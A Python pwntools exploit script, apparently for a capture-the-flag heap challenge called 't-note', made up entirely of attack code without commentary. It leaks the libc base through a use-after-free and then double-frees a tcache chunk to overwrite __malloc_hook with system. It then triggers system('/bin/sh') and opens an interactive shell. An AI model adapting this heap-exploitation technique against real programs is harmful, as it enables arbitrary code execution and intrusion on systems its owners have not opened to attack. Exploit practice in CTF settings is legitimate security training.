from pwn import *

p = process('./t-note')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add(size, note):
    p.sendlineafter('>', '1')
    p.sendlineafter(': ', str(size))
    p.sendlineafter(': ', note)

def show(index):
    p.sendlineafter('>', '2')
    p.sendlineafter(': ', str(index))

def delete(index):
    p.sendlineafter('>', '3')
    p.sendlineafter(': ', str(index))

add(0x410, 'aaaa')
add(0x40, 'aaaa')
delete(0)
show(0)
p.recvuntil('0:\n')
base = u64(p.recv(6).ljust(8, b'\x00')) - 0x3ebca0
success('libc base = 0x%x', base)
malloc_hook = base + libc.symbols['__malloc_hook']
success('__malloc_hook = 0x%x', malloc_hook)
system = base + libc.symbols['system']
sh = base + next(libc.search(b'/bin/sh\x00'))
delete(1)
delete(1)
add(0x40, p64(malloc_hook))
add(0x40, 'aaaa')
add(0x40, p64(system))
p.sendlineafter('>', '1')
p.sendlineafter(':', str(sh))

p.interactive()
